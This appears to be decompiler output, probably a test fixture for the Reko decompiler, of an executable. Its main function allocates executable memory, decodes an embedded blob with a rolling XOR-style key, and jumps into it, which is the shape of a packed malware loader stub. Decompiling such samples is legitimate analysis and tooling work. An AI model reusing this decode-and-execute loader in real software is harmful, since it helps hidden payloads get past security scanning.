// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00413423: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_2 eax_23 = SwitchDesktop(tArg00);
	if (eax_23 == 0x00)
		eax_23 = fn0041344D((byte) GetPrivateProfileIntW(fp - 0x04, fp - 0x04, 0xF8, fp - 0x04));
	return eax_23;
}

// 0041344D: Register word32 fn0041344D(Register byte bl)
word32 fn0041344D(byte bl)
{
	byte * esi_21 = (byte *) 0x000142FF;
	Eq_32 edi_22 = VirtualAlloc(0x00, 0x0001423F, 0x3000, 0x40);
	word32 ecx_23 = 0x01E3;
	word32 * esp_24 = fp - 0x14;
	Eq_50 edx_30 = DPB(4206565804, bl + 0xAC, 0);
	word32 ebp_103 = 0x00;
l004134AE:
	union Eq_50 * esp_44 = esp_24 - 0x04;
	*esp_44 = (union Eq_50 *) edx_30;
	Mem49[edi_22 + 0x00:byte] = Mem45[edi_22 + 0x00:byte] + (Mem45[esi_21 + 0x00:byte] + Mem45[esp_44 + 0x00:byte]);
	word32 ebp_58 = ebp_103 + 0x000B1B02;
	Eq_50 edx_50 = *esp_44;
	esp_24 = (word32 *) ((char *) esp_44 + 0x04);
	esi_21 = esi_21 + 0x01;
	edi_22 = edi_22 + 0x01;
	ebp_103 = ebp_58 - 0x000B1B01;
	uint32 edx_101 = edx_50 >> 0x08;
	byte dl_102 = (byte) (edx_50 >> 0x08);
	if (0x04 == ebp_58 - 0x000B1B01)
	{
		edx_101 = 4206565804;
		dl_102 = 0xAC;
		ebp_103 = 0x00;
	}
	do
	{
		byte dl_75 = dl_102 + bl;
		edx_30 = DPB(edx_101, dl_75, 0);
		ecx_23 = ecx_23 - 0x01;
		if (ecx_23 != 0x00)
			goto l004134AE;
		<anonymous> * eax_81 = *esp_24;
		word32 eax_85;
		byte SCZO_86;
		byte bh_94;
		byte Z_95;
		byte SZO_96;
		byte C_97;
		eax_81();
	} while (false);
	return eax_85;
}

